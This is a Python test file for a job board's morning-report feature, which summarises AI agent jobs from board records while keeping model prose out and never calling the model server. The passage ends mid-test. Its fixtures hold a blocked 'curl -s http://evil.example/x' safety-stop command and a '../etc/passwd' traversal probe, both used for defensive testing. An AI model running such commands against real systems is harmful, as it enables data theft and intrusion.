"""Upgrade 10: the morning report - web/morningreport.py and the "# U10" hooks in jobboard.py.

The engine that turns facts into markdown is `agentjobs_upgrades/report.py` (upgrade 10's tested
logic, pinned in test_rest.py). These tests are about the glue and about what Jason actually
reads:

  * every number, status and reason comes from a record the board wrote: a job's meta.json, a
    queue file, a bench run. Text the model wrote is never copied as a fact - the one place prose
    may enter is the paragraph under "Qwen's summary", and only when the model server is loaded
    and nobody is using it. A busy or offline server is not asked, not even contacted.
  * Needs you at the top: a job waiting for approval, a safety stop, a failure that halted its
    queue, a job whose tests were changed - each with a link a phone can follow.
  * per project: done / failed / waiting / skipped, with the reason for a failure taken in the
    spec's order (the first line of the first failing required check, the watchdog's own words,
    or "Safety stop: <command>"), and every failed line links to the review bundle.
  * one report when the clock passes the set time (one missed while a job ran comes out as soon as
    the worker is free), one when a project queue finishes or halts, one per button press - never
    two for the same event, and the next window starts where the last report ended.
  * state/reports/YYYY-MM-DD.md + index.json and state/report-settings.json (0600), outside
    anything the sandbox mounts; the Reports tab, a saved report, its raw text and its two forms
    behind the upgrade 8 session + form token, with everything escaped.

Nothing here calls the model server (127.0.0.1:8080): jobboard.basalt_status is patched in the
page tests, and vision.http_call - the only thing that could dial it - is swapped out for the
whole module, so a report that tried to ask the model fails the run instead.
"""
import http.server
import json
import os
import re
import shutil
import socket
import stat
import subprocess
import sys
import tempfile
import threading
import time
import unittest
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timedelta
from pathlib import Path
from unittest import mock

import decisions
import jobboard
import morningreport
import notifycfg
from agentjobs_upgrades import notify, report as rp, vision

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

BASE = "http://board.test:8091"          # what a report's links point at (never contacted)
JID1 = "20261111-221000-a1b2"
JID2 = "20261111-231500-c3d4"
JID3 = "20261111-235000-e5f6"
MODEL_PROSE = "the model wrote this itself and it is not a fact"


# No report may reach the model server, and none may buzz the phone for real either:
# morningreport.qwen_summary only ever calls the wire through vision.http_call, and every ntfy
# send ends in notify._post. Both are swapped out for the whole module, so a test that lets a
# report dial something fails the run instead of opening a connection.
_http_calls = []
_post_calls = []
_http_patch = None
_post_patch = None
_REAL_HTTP = vision.http_call           # the one test that proves the reply shape uses this


def _no_http(*args, **kwargs):
    _http_calls.append(args[:1])
    raise AssertionError("a report tried to call the model server")


def _no_post(*args, **kwargs):
    _post_calls.append(args[:1])
    raise AssertionError("a report tried to send a real notification")


def setUpModule():
    global _http_patch, _post_patch
    del _http_calls[:], _post_calls[:]
    _http_patch = mock.patch.object(vision, "http_call", _no_http)
    _http_patch.start()
    _post_patch = mock.patch.object(notify, "_post", _no_post)
    _post_patch.start()


def tearDownModule():
    _http_patch.stop()
    _post_patch.stop()
    if _http_calls:
        raise AssertionError(f"{len(_http_calls)} test(s) reached vision.http_call: {_http_calls[:3]}")
    if _post_calls:
        raise AssertionError(f"{len(_post_calls)} test(s) reached notify._post: {_post_calls[:3]}")


def wait_for(pred, secs=15.0):
    end = time.time() + secs
    while time.time() < end:
        if pred():
            return True
        time.sleep(0.02)
    return False


# ------------------------------------------------------------------ fixtures

TRACE = ('Traceback (most recent call last):\n'
         '  File "/home/jason/agent-work/notes/app.py", line 12, in export\n'
         '    assert row.token == tok\n'
         'AssertionError: the export test fails\n'
         'Ran 13 tests in 0.4s')

PASSED_SUMMARY = {"status": "passed", "results": [
    {"name": "tests", "cmd": "python3 -m unittest", "ok": True, "passed": 42, "failed": 0,
     "exit_code": 0, "mode": "required"}]}

# verify.py's outcome, as meta.json holds it: status, the rounds it ran, the guard's issues, the
# banner and the standing "final" summary. (badges.py reads verify["rounds"][-1]["round"], so the
# rounds are records, not bare lists.)
PASSED_VERIFY = {"status": "passed", "issues": [], "started": time.time() - 900,
                 "banner": {"colour": "green", "text": "Checks passed"},
                 "rounds": [{"round": 0, "summary": PASSED_SUMMARY},
                            {"round": 1, "summary": PASSED_SUMMARY}],
                 "final": PASSED_SUMMARY}

FAILED_SUMMARY = {"status": "failed", "results": [
    {"name": "tests", "ok": False, "mode": "required", "passed": 10, "failed": 3,
     "exit_code": 1, "first_error": TRACE},
    {"name": "lint", "ok": False, "mode": "advisory",
     "first_error": "two lines need fixing\nand a third"}]}

FAILED_VERIFY = {"status": "failed", "issues": [], "started": time.time() - 900,
                 "banner": {"colour": "red", "text": "Checks failed: tests"},
                 "rounds": [{"round": 0, "summary": FAILED_SUMMARY},
                            {"round": 1, "summary": FAILED_SUMMARY},
                            {"round": 2, "summary": FAILED_SUMMARY}],
                 "final": FAILED_SUMMARY}


def rec(jid, status="done", folder="notes", job=None, **over):
    """A finished job record in the shape jobboard.py writes (meta.json)."""
    t = time.time()
    m = {"id": jid, "kind": "agent", "mode": "local-qwen", "folder": folder,
         "job": job if job is not None else "Add the export button", "status": status,
         "offline": True, "created": t - 1800, "started": t - 1800, "exit": 0,
         "finished": None if status in ("queued", "running", "stopping") else t - 120}
    m.update(over)
    return m


def done_job(jid=JID1, **over):
    over.setdefault("verify", PASSED_VERIFY)
    return rec(jid, **over)


def failed_job(jid=JID2, **over):
    over.setdefault("verify", FAILED_VERIFY)
    over.setdefault("status", "failed")
    return rec(jid, **over)


def stop_job(jid=JID3, **over):
    """A job the safety guard ended, naming the command it would not run."""
    m = rec(jid, status="safety_stop", fail_note="Safety stop: tried to reach a web address",
            **over)
    m["watchdog"] = [{"time": m["finished"], "kind": "safety_stop",
                      "reason": "Safety stop: the job tried to leave this PC",
                      "command": "curl -s http://evil.example/x"}]
    return m


def bench_rec(jid="bench-run-1", **over):
    t = time.time()
    m = {"id": jid, "kind": "bench", "mode": "bench", "folder": "eval", "job": "draft6 tonight",
         "status": "done", "created": t - 3600, "started": t - 3600, "finished": t - 600,
         "exit": 0}
    m.update(over)
    return m


def queue_file(queues, folder, status, tasks, when=None):
    """A queue state file, as plan.Queue writes it, with an mtime inside (or outside) the window."""
    queues = Path(queues)
    queues.mkdir(parents=True, exist_ok=True)
    p = queues / f"{folder}.json"
    p.write_text(json.dumps({"tasks": tasks, "status": status, "on_fail": "stop",
                             "created": time.time() - 7200}), encoding="utf-8")
    os.utime(p, ((when if when is not None else time.time() - 300),) * 2)
    return p


def task(tid, title, state, job_id=None):
    return {"id": tid, "title": title, "milestone": "M1", "state": state, "job_id": job_id}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


OPENER = urllib.request.build_opener(NoRedirect)


def earlier_today():
    """A HH:MM earlier today (the daily-report time the clock tests need)."""
    now = datetime.now()
    t = now - timedelta(minutes=90)
    return "00:00" if t.date() != now.date() else t.strftime("%H:%M")


def later_today():
    now = datetime.now()
    t = now + timedelta(minutes=90)
    return "23:59" if t.date() != now.date() else t.strftime("%H:%M")


def daylight():
    """A quiet-hours window three hours from the current hour, so the one test that wants a
    notification to go out is not at the mercy of the time the suite started at."""
    h = datetime.now().hour
    return {"quiet_start": f"{(h + 3) % 24:02d}:00", "quiet_end": f"{(h + 4) % 24:02d}:00"}


def at(h, m, day_ts=None):
    """A timestamp at HH:MM today (local), for the clock rule."""
    d = datetime.fromtimestamp(day_ts if day_ts is not None else time.time())
    return d.replace(hour=h, minute=m, second=0, microsecond=0).timestamp()


def md_for(jobs, queues=None, since=None, until=None, base_url=BASE, bench_verdict=None):
    """Facts straight out of the records, through the engine - what report.build would print."""
    since = time.time() - 3600 if since is None else since
    until = time.time() if until is None else until
    facts, bench = morningreport.gather(jobs, queues, since, until, bench_verdict)
    return rp.build(facts, bench, since=since, until=until, base_url=base_url)


# ------------------------------------------------------------------ settings

class Settings(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="u10-cfg-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.path = self.tmp / "report-settings.json"

    def test_the_default_is_a_report_at_seven_and_the_model_may_speak(self):
        s = morningreport.settings(self.path)
        self.assertEqual(s.time, "07:00")
        self.assertTrue(s.ask_model)
        self.assertFalse(self.path.exists(), "reading the settings must not create a file")

    def test_a_broken_settings_file_is_the_default_not_a_crash(self):
        self.path.write_text("{not json", encoding="utf-8")
        self.assertEqual(morningreport.settings(self.path).time, "07:00")

    def test_the_settings_are_written_0600_and_read_back(self):
        morningreport.save(self.path, morningreport.ReportSettings(time="06:15", ask_model=False))
        self.assertEqual(stat.S_IMODE(self.path.stat().st_mode), 0o600)
        s = morningreport.settings(self.path)
        self.assertEqual(s.time, "06:15")
        self.assertFalse(s.ask_model)

    def test_a_time_that_is_not_a_time_is_refused_and_saves_nothing(self):
        for bad in ("7 o clock", "25:00", "07", "07:0o", "next Tuesday"):
            errs = morningreport.save_form(self.path, {"time": [bad]})
            self.assertTrue(errs, bad)
            self.assertIn("07:00", errs[0])
        self.assertFalse(self.path.exists(), "a typo must not move or switch off the report")

    def test_the_form_saves_a_new_time_and_the_model_tick(self):
        errs = morningreport.save_form(self.path, {"time": ["06:45"], "ask_model": ["1"]})
        self.assertEqual(errs, [])
        s = morningreport.settings(self.path)
        self.assertEqual((s.time, s.ask_model), ("06:45", True))
        errs = morningreport.save_form(self.path, {"time": ["06:45"]})
        self.assertEqual(errs, [])
        self.assertFalse(morningreport.settings(self.path).ask_model)
        errs = morningreport.save_form(self.path, {"time": [""]})
        self.assertEqual(errs, [])
        self.assertEqual(morningreport.settings(self.path).time, "06:45",
                         "an empty box keeps the time that was saved")

    def test_a_broken_time_in_the_file_falls_back_to_seven(self):
        self.path.write_text(json.dumps({"time": "tea time", "ask_model": False}), encoding="utf-8")
        s = morningreport.settings(self.path)
        self.assertEqual(s.time, "07:00")
        self.assertFalse(s.ask_model)

    def test_the_report_and_its_settings_are_outside_the_sandbox(self):
        """10 keeps every report and setting out of anything the jail mounts: a job must not be
        able to write its own report or move the window it covers."""
        home = Path(tempfile.mkdtemp(prefix="jb10-def-"))
        env = dict(os.environ, HOME=str(home), JOBBOARD_READONLY="1")
        for k in ("JOBBOARD_REPORTS", "JOBBOARD_REPORT_SETTINGS", "JOBBOARD_WORK", "JOBBOARD_JOBS"):
            env.pop(k, None)
        r = subprocess.run([sys.executable, "-c",
                            "import jobboard; print(jobboard.REPORTS); print(jobboard.REPORT_SETTINGS);"
                            " print(jobboard.WORK)"],
                           env=env, capture_output=True, text=True, cwd=str(ROOT), timeout=120)
        self.assertEqual(r.returncode, 0, r.stderr)
        reports, settings_file, work = r.stdout.split()
        self.assertEqual(reports, str(home / "agent-sandbox" / "state" / "reports"))
        self.assertEqual(settings_file,
                         str(home / "agent-sandbox" / "state" / "report-settings.json"))
        self.assertFalse(Path(reports).is_relative_to(work), "the sandbox mounts ~/agent-work")
        for mounted in ("home-local", "android-sdk"):
            self.assertFalse(Path(reports).is_relative_to(
                home / "agent-sandbox" / "state" / mounted), mounted)


# ------------------------------------------------------------------ records -> facts

class Facts(unittest.TestCase):
    """job_fact / bench_fact / gather: what the board knows, and only that."""

    def test_a_finished_job_is_a_tick_with_its_test_count(self):
        fact = morningreport.job_fact(done_job())
        self.assertEqual(fact["status"], "passed")
        self.assertEqual(fact["tests_passed"], 42)
        self.assertEqual(fact["project"], "notes")
        self.assertEqual(fact["title"], "Add the export button")
        self.assertEqual(fact["approval"], "waiting", "nothing on this board merges by itself")

    def test_the_checks_rerun_is_what_gets_counted(self):
        m = done_job(verify=FAILED_VERIFY,
                     recheck={"summary": {"status": "passed", "results": [
                         {"name": "tests", "ok": True, "passed": 17, "failed": 0}]}})
        fact = morningreport.job_fact(m)
        self.assertEqual(fact["status"], "passed")
        self.assertEqual(fact["tests_passed"], 17)

    def test_rounds_rollbacks_and_tries_come_from_the_record(self):
        m = done_job(attempt_log=[{"k": 1}, {"k": 2}, {"k": 3}],
                     checkpoints={"rollbacks": 2}, verify=dict(PASSED_VERIFY, rounds=[[], [], []]))
        fact = morningreport.job_fact(m)
        self.assertEqual((fact["rounds"], fact["rollbacks"], fact["attempts"]), (3, 2, 3))
        self.assertEqual(morningreport.job_fact(done_job())["attempts"], 1, "an ordinary job is one try")

    def test_a_queued_job_is_not_in_the_report_and_a_running_one_is(self):
        self.assertIsNone(morningreport.job_fact(rec(JID1, status="queued")))
        self.assertEqual(morningreport.job_fact(rec(JID1, status="running"))["status"], "running")
        self.assertIsNone(morningreport.job_fact(None))

    def test_a_finished_job_is_only_as_good_as_its_checks(self):
        for vst, want in (("passed", "passed"), ("needs_review", "needs_review"),
                          ("stuck", "stuck"), ("failed", "failed")):
            self.assertEqual(morningreport.report_status(done_job(verify={"status": vst})), want)
        self.assertEqual(morningreport.report_status(rec(JID1, verify=None)), "unverified")

    def test_what_upgrade_8_left_decided_is_shown(self):
        for kind, word in (("merge", "merged"), ("reject", "rejected"), ("changes", "changes")):
            m = done_job(decision_log=[{"kind": kind, "time": time.time(), "by": "jason"}])
            self.assertEqual(morningreport.job_fact(m)["approval"], word, kind)
        m = done_job(decision_log=[{"kind": "merge", "time": time.time()},
                                   {"kind": "undo-merge", "time": time.time()}])
        self.assertEqual(morningreport.job_fact(m)["approval"], "waiting")
        self.assertNotIn("approval", morningreport.job_fact(failed_job()),
                         "a failed job is not waiting for an approval")

    def test_the_reason_a_failure_happened_follows_the_spec_order(self):
        """first failing check line -> watchdog reason -> Safety stop: <command>."""
        self.assertEqual(morningreport.first_failing_line(failed_job()),
                         "Traceback (most recent call last):")
        m = failed_job(watchdog=[{"time": time.time(), "kind": "nudge", "reason": "keep going"},
                                 {"time": time.time(), "kind": "stop",
                                  "reason": "It started the same command over and over"}])
        self.assertEqual(morningreport.watchdog_stop_reason(m),
                         "It started the same command over and over")
        self.assertEqual(morningreport.safety_command(stop_job()), "curl -s http://evil.example/x")

    def test_a_required_check_failure_is_the_reason_before_an_advisory_one(self):
        lines = morningreport.check_lines(failed_job())
        self.assertEqual(lines[0], "Traceback (most recent call last):",
                         "an advisory failure never stands in for why a job failed")

    def test_an_advisory_failure_is_used_when_it_is_the_only_one(self):
        m = done_job(status="failed", verify={"status": "failed", "final": {"status": "failed", "results": [
            {"name": "tests", "ok": True, "mode": "required"},
            {"name": "lint", "ok": False, "mode": "advisory", "first_error": "two lines need fixing"}]}})
        self.assertEqual(morningreport.first_failing_line(m), "two lines need fixing")

    def test_a_check_line_is_one_short_line_of_the_record(self):
        def only(*results):
            m = rec(JID1, status="failed", verify={"status": "failed", "final": {
                "status": "failed", "results": list(results)}})
            return morningreport.first_failing_line(m)
        self.assertEqual(only({"name": "build", "ok": False, "mode": "required",
                               "timed_out": True}), "build took too long")
        self.assertEqual(only({"name": "screens", "ok": False, "type": "vision",
                               "issues": ["the Save button is missing"]}),
                         "the Save button is missing")
        self.assertEqual(only({"name": "screens", "ok": False, "type": "vision"}),
                         "screens does not look right")
        self.assertEqual(only({"name": "tests", "ok": False, "failed": 3}), "tests: 3 failing")
        self.assertEqual(only({"name": "build", "ok": False, "exit_code": 2}), "build (exit 2)")
        self.assertEqual(only({"name": "tests", "ok": True}), "", "a passing check says nothing")
        self.assertEqual(morningreport.first_failing_line(failed_job()),
                         "Traceback (most recent call last):", "one line, not the whole log")

    def test_a_safety_stop_line_names_the_command_it_refused(self):
        fact = morningreport.job_fact(stop_job())
        self.assertEqual(fact["status"], "safety_stop")
        self.assertEqual(fact["safety_command"], "curl -s http://evil.example/x")
        md = md_for([stop_job()])
        self.assertIn("Safety stop: curl -s http://evil.example/x", md)

    def test_a_safety_stop_caught_by_path_names_the_path(self):
        m = rec(JID1, status="safety_stop")
        m["watchdog"] = [{"time": m["finished"], "kind": "safety_stop",
                          "reason": "Safety stop: that reads a private location",
                          "path": "~/agent-sandbox/state/notify-settings.json"}]
        self.assertEqual(morningreport.safety_command(m), "~/agent-sandbox/state/notify-settings.json")

    def test_a_job_the_agent_left_notes_about_still_reports_the_board_s_words(self):
        m = failed_job(fail_note="Checks failed: tests")
        self.assertEqual(morningreport.job_fact(m)["banner"], "Checks failed: tests")

    def test_a_bench_set_is_its_own_line_with_its_verdict(self):
        fact = morningreport.bench_fact(bench_rec(), "overall 3.4 \u2b12 0.5")
        self.assertEqual(fact["label"], "draft6 tonight")
        self.assertEqual(fact["verdict"], "overall 3.4 \u2b12 0.5")
        died = morningreport.bench_fact(bench_rec(status="failed", fail_note="Basalt stopped"))
        self.assertIn("failed", died["verdict"])
        facts, bench = morningreport.gather([bench_rec()], None, time.time() - 3600, time.time(),
                                            bench_verdict=lambda m: "overall 4.1 \u2b12 0.2")
        self.assertEqual(len(bench), 1)
        self.assertEqual(facts, [], "a bench set is not a job")

    def test_the_window_picks_the_records_by_when_they_ended(self):
        now = time.time()
        old = done_job(JID1, finished=now - 7200)
        new = failed_job(JID2, finished=now - 60)
        facts, _bench = morningreport.gather([old, new], None, now - 3600, now)
        self.assertEqual([f["id"] for f in facts], [JID2])

    def test_a_record_with_junk_in_it_does_not_stop_the_report(self):
        """make() promises never to raise, and one strange record must not lose the report."""
        now = time.time()
        junk = [{"id": "x1", "started": "yesterday", "finished": "last night"},
                {"id": "x2", "started": now - 60, "finished": now - 30, "status": "done"},
                "not a record at all", None]
        facts, bench = morningreport.gather(junk, None, now - 3600, now)
        self.assertEqual([f["id"] for f in facts], ["x2"])
        self.assertEqual(bench, [])


# ------------------------------------------------------------------ the report itself

class Report(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="u10-md-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.reports = self.tmp / "reports"
        self.settings = self.tmp / "report-settings.json"
        self.queues = self.tmp / "queues"

    def build(self, jobs, queues=None, base_url=BASE, **kw):
        return md_for(jobs, queues, **dict(kw, base_url=base_url))

    def test_needs_you_names_everything_waiting_for_jason_with_a_link(self):
        queue_file(self.queues, "notes", "stopped", [task("t1", "One", "failed", JID2),
                                                     task("t2", "Two", "queued")])
        md = self.build([done_job(JID1),                                    # waiting approval
                        stop_job(JID3),                                     # safety stop
                        failed_job(JID2)], queues=self.queues)              # halts its queue
        needs = md.split("## Needs you")[1].split("##")[0]
        self.assertIn(f"[Add the export button]({BASE}/jobs/{JID1}) is waiting for your approval",
                      needs)
        self.assertIn(f"[Add the export button]({BASE}/jobs/{JID3}): Safety stop: curl", needs)
        self.assertIn("blocking its queue", needs)
        for line in needs.splitlines():
            if "Add the export button]" not in line:
                continue
            self.assertIn(f"{BASE}/jobs/", line, "every Needs-you line carries a link")

    def test_a_job_whose_tests_were_changed_is_in_needs_you(self):
        m = done_job(verify=dict(PASSED_VERIFY, status="needs_review",
                                 issues=[{"name": "tests", "why": "the test file changed"}]))
        md = self.build([m])
        self.assertIn("is waiting for your approval", md.split("## Needs you")[1])
        self.assertIn("- needs_review: [Add the export button]", md,
                      "and its line says the tests were what needed a look")

    def test_nothing_waiting_says_so(self):
        md = self.build([done_job(approval="merged", decision_log=[{"kind": "merge"}])])
        self.assertIn("\U0001f389", md.split("## Needs you")[1].split("##")[0])

    def test_a_failure_that_did_not_halt_its_queue_is_not_in_needs_you(self):
        md = self.build([failed_job()])
        self.assertNotIn("blocking its queue", md.split("## Needs you")[1].split("##")[0])
        self.assertIn(f"- \u2717 [Add the export button]({BASE}/jobs/{JID2}): Traceback", md,
                      "it is still counted in its project")

    def test_per_project_counts_and_the_reason_for_each_failure(self):
        now = time.time()
        jobs = [done_job(JID1, started=now - 4800, finished=now - 3000),        # 30 min
                failed_job(JID2, started=now - 3000, finished=now - 2400),      # 10 min
                rec(JID3, folder="phone", job="Fix the login screen",
                    started=now - 900, finished=now - 300)]                     # 10 min
        md = md_for(jobs, since=now - 3600, until=now)
        self.assertIn("## notes", md)
        self.assertIn("1 done, 1 failed, 0 other \u00b7 40 min \u00b7 5 fix rounds \u00b7 "
                      "0 rollbacks \u00b7 0 extra attempts", md)
        self.assertIn("- \u2713 [Add the export button](%s/jobs/%s) (42 tests)" % (BASE, JID1), md)
        self.assertIn("- \u2717 [Add the export button](%s/jobs/%s): Traceback (most recent "
                      "call last):" % (BASE, JID2), md)
        self.assertIn("## phone", md)
        self.assertIn("0 done, 0 failed, 1 other", md)
        self.assertIn("- unverified: [Fix the login screen]", md)

    def test_every_failed_line_links_to_the_review_bundle(self):
        md = self.build([failed_job()])
        self.assertIn(f"export for review: /api/jobs/{JID2}/bundle", md)

    def test_the_report_covers_the_window_it_names(self):
        now = time.time()
        md = md_for([done_job()], since=now - 3600, until=now)
        self.assertIn(f"Covers {time.strftime('%d %b %H:%M', time.localtime(now - 3600))} to "
                      f"{time.strftime('%d %b %H:%M', time.localtime(now))}.", md)
        self.assertIn("# Morning report \u2013", md)

    def test_a_period_with_nothing_in_it_says_so(self):
        md = md_for([], since=time.time() - 60, until=time.time())
        self.assertIn("Nothing ran in this period.", md)

    def test_no_model_written_text_is_copied_as_a_fact(self):
        """The report is built from the fields the board wrote. A record holding model prose -
        an agent summary, its notes, its own todo list - must not put that prose in the facts."""
        m = done_job(job="Write the export button", agent_summary=MODEL_PROSE, notes=MODEL_PROSE,
                     todos=[MODEL_PROSE], final_message=MODEL_PROSE, plan=MODEL_PROSE,
                     agent_notes=MODEL_PROSE, summary=MODEL_PROSE, report=MODEL_PROSE,
                     review=MODEL_PROSE, commits=[MODEL_PROSE],
                     verify=dict(PASSED_VERIFY, issues=[MODEL_PROSE]))
        md = self.build([m, failed_job(agent_summary=MODEL_PROSE, fail_note=MODEL_PROSE),
                        stop_job(agent_summary=MODEL_PROSE)])
        self.assertNotIn(MODEL_PROSE, md)
        self.assertIn("Write the export button", md)

    def test_the_bench_section_carries_the_overall_verdict(self):
        now = time.time()
        facts, bench = morningreport.gather([bench_rec()], None, now - 3600, now,
                                            bench_verdict=lambda m: "overall 3.4 \u2b12 0.5")
        md = rp.build(facts, bench, since=now - 3600, until=now, base_url=BASE)
        self.assertIn("## Bench", md)
        self.assertIn("draft6 tonight: overall 3.4 \u2b12 0.5", md)

    def test_a_links_are_plain_text_when_no_phone_address_is_set(self):
        md = md_for([done_job()], base_url="")
        self.assertIn("- \u2713 Add the export button", md)
        self.assertNotIn("](" + BASE, md)


# ------------------------------------------------------------------ queues

class Queues(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="u10-q-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.queues = self.tmp / "queues"

    def test_a_halted_queue_names_the_job_that_blocked_it(self):
        queue_file(self.queues, "notes", "stopped",
                   [task("t1", "One", "done", JID1), task("t2", "Two", "failed", JID2),
                    task("t3", "Three", "queued")])
        self.assertEqual(morningreport.blocked_job_ids(self.queues), {JID2})
        facts, _b = morningreport.gather([failed_job(JID2)], self.queues,
                                         time.time() - 3600, time.time())
        blocked = [f for f in facts if f["id"] == JID2]
        self.assertTrue(blocked[0].get("queue_blocked"))
        md = rp.build(facts, [], since=time.time() - 3600, until=time.time(), base_url=BASE)
        self.assertIn("blocking its queue", md.split("## Needs you")[1].split("##")[0])

    def test_a_queue_that_carried_on_after_a_failure_blocks_nothing(self):
        queue_file(self.queues, "notes", "finished",
                   [task("t1", "One", "done", JID1), task("t2", "Two", "failed", JID2)])
        self.assertEqual(morningreport.blocked_job_ids(self.queues), set())

    def test_tasks_the_queue_never_got_to_are_reported_against_the_project(self):
        queue_file(self.queues, "notes", "stopped",
                   [task("t1", "One", "done", JID1), task("t2", "Two", "failed", JID2),
                    task("t3", "Three", "queued"), task("t4", "Four", "interrupted")])
        facts = [f for f in morningreport.gather([], self.queues, time.time() - 3600,
                                                time.time())[0] if f["project"] == "notes"]
        states = {f["title"]: f["status"] for f in facts}
        self.assertEqual(states, {"Three": "blocked", "Four": "blocked"})

    def test_tasks_skipped_after_a_failure_are_reported_as_skipped(self):
        queue_file(self.queues, "notes", "running",
                   [task("t1", "One", "done", JID1), task("t2", "Two", "failed", JID2),
                    task("t3", "Three", "skipped")])
        now = time.time()
        facts = morningreport.gather([failed_job(JID2)], self.queues, now - 3600, now)[0]
        self.assertEqual([(f["status"], f["id"]) for f in facts if f["status"] == "skipped"],
                         [("skipped", "notes")])
        md = rp.build(facts, [], since=now - 3600, until=now, base_url=BASE)
        self.assertIn("- skipped: [Three]", md)
        self.assertIn(f"- \u2717 [Add the export button]({BASE}/jobs/{JID2})", md,
                      "the task that failed is a job line, not a queue line")

    def test_a_queue_file_from_before_the_window_is_left_out(self):
        queue_file(self.queues, "notes", "stopped", [task("t3", "Three", "queued")],
                   when=time.time() - 86400)
        self.assertEqual(morningreport.gather([], self.queues, time.time() - 3600,
                                             time.time())[0], [])

    def test_a_broken_queue_file_is_ignored_not_fatal(self):
        (self.queues).mkdir(parents=True, exist_ok=True)
        (self.queues / "bad.json").write_text("nope", encoding="utf-8")
        (self.queues / "list.json").write_text("[1, 2]", encoding="utf-8")
        self.assertEqual(morningreport.queue_rows(self.queues), [])
        self.assertEqual(morningreport.blocked_job_ids(self.queues), set())


# ------------------------------------------------------------------ the clock

class Schedule(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="u10-clock-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.reports = self.tmp / "reports"
        self.settings = self.tmp / "report-settings.json"

    def make(self, jobs=(), **kw):
        kw.setdefault("force", False)
        return morningreport.make(reports=self.reports, settings_path=self.settings,
                                  jobs=list(jobs), **kw)

    def names(self):
        return [e["name"] for e in morningreport.index_of(self.reports)]

    def test_the_daily_report_is_due_once_the_clock_passes_its_time(self):
        morningreport.save(self.settings, morningreport.ReportSettings(time="07:00"))
        self.assertFalse(morningreport.due(self.settings, self.reports, at(6, 59)))
        self.assertTrue(morningreport.due(self.settings, self.reports, at(7, 0)))
        self.assertTrue(morningreport.due(self.settings, self.reports, at(19, 30)))

    def test_a_missed_report_comes_out_as_soon_as_the_worker_is_free(self):
        """A long job at 07:00 delays the report; it does not lose it."""
        morningreport.save(self.settings, morningreport.ReportSettings(time="07:00"))
        self.assertTrue(morningreport.due(self.settings, self.reports, at(9, 45)))
        day = datetime.fromtimestamp(at(9, 45)).strftime("%Y-%m-%d")
        morningreport.save_index(self.reports, [{"name": f"{day}.md", "day": day, "made": at(9, 45),
                                                 "since": at(7, 0), "until": at(9, 45), "jobs": 1,
                                                 "bench": 0, "waiting": 0, "trigger": "clock"}])
        self.assertFalse(morningreport.due(self.settings, self.reports, at(9, 50)),
                         "and it is not made twice in the same day")
        self.assertTrue(morningreport.due(self.settings, self.reports, at(7, 5, at(9, 50) + 86400)),
                        "tomorrow's report is due again")

    def test_the_clock_trigger_makes_one_report_and_then_waits_for_tomorrow(self):
        morningreport.save(self.settings, morningreport.ReportSettings(time=earlier_today()))
        first = morningreport.tick(reports=self.reports, settings_path=self.settings,
                                   jobs=[done_job()])
        self.assertIsNotNone(first)
        self.assertEqual(first["trigger"], "clock")
        self.assertIsNone(morningreport.tick(reports=self.reports, settings_path=self.settings,
                                             jobs=[done_job(), failed_job()]),
                          "one report a day, not one per worker loop")
        self.assertEqual(len(self.names()), 1)

    def test_the_next_report_starts_where_the_last_one_ended(self):
        now = time.time()
        morningreport.save(self.settings, morningreport.ReportSettings(time=earlier_today()))
        first = morningreport.make(reports=self.reports, settings_path=self.settings,
                                   jobs=[done_job(JID1, finished=now - 600)], force=True)
        self.assertEqual(morningreport.since_for(self.reports), first["until"])
        second = morningreport.make(reports=self.reports, settings_path=self.settings,
                                    jobs=[done_job(JID1, finished=now - 600),
                                          failed_job(JID2, finished=time.time())], force=True)
        self.assertGreater(second["since"], first["until"] - 1)
        self.assertEqual(second["jobs"], 1, "the first job is not counted twice")

    def test_the_very_first_report_looks_back_a_day(self):
        self.assertAlmostEqual(morningreport.since_for(self.reports), time.time() - 86400, delta=5)

    def test_an_automatic_report_with_nothing_to_say_writes_nothing(self):
        self.assertIsNone(self.make([]))
        self.assertEqual(self.names(), [])
        self.assertFalse((self.reports / "index.json").exists())

    def test_the_button_always_writes_one(self):
        entry = self.make([], force=True)
        self.assertIsNotNone(entry)
        self.assertEqual(entry["trigger"], "manual")
        self.assertIn("Nothing ran in this period.",
                      morningreport.read_report(self.reports, entry["name"]))

    def test_two_reports_on_the_same_day_are_named_2_and_3(self):
        self.assertEqual(self.make([done_job(JID1)], force=True)["name"],
                         datetime.now().strftime("%Y-%m-%d") + ".md")
        self.assertEqual(self.make([failed_job(JID2)], force=True)["name"],
                         datetime.now().strftime("%Y-%m-%d") + "-2.md")
        self.assertEqual(self.make([stop_job(JID3)], force=True)["name"],
                         datetime.now().strftime("%Y-%m-%d") + "-3.md")
        self.assertEqual(len(self.names()), 3)

    def test_the_report_file_and_its_index_are_written_where_they_belong(self):
        entry = self.make([done_job(), failed_job(), stop_job()], force=True)
        path = self.reports / entry["name"]
        self.assertTrue(path.is_file())
        self.assertIn("# Morning report", path.read_text(encoding="utf-8"))
        index = json.loads((self.reports / "index.json").read_text(encoding="utf-8"))
        self.assertEqual(index[0]["name"], entry["name"])
        self.assertEqual(index[0]["jobs"], 3)
        self.assertEqual(index[0]["waiting"], 2, "the finished job and the safety stop")

    def test_a_broken_record_makes_a_report_not_a_crash(self):
        entry = morningreport.make(reports=self.reports, settings_path=self.settings,
                                   jobs=[{"id": "x", "started": "yesterday"}, None, done_job()],
                                   force=True)
        self.assertIsNotNone(entry)

    def test_only_a_saved_date_file_can_be_read_back(self):
        self.assertIsNone(morningreport.read_report(self.reports, "../etc/passwd"))
        self.assertIsNone(morningreport.read_report(self.reports, "notes.md"))
        self.assertIsNone(morningreport.read_report(self.reports, ""))
        self.assertIsNone(morningreport.read_report(self.reports, None))
        self.reports.mkdir(parents=True, exist_ok=True)
        (self.reports / "2026-11-11.md").write_text("# Report\n", encoding="utf-8")
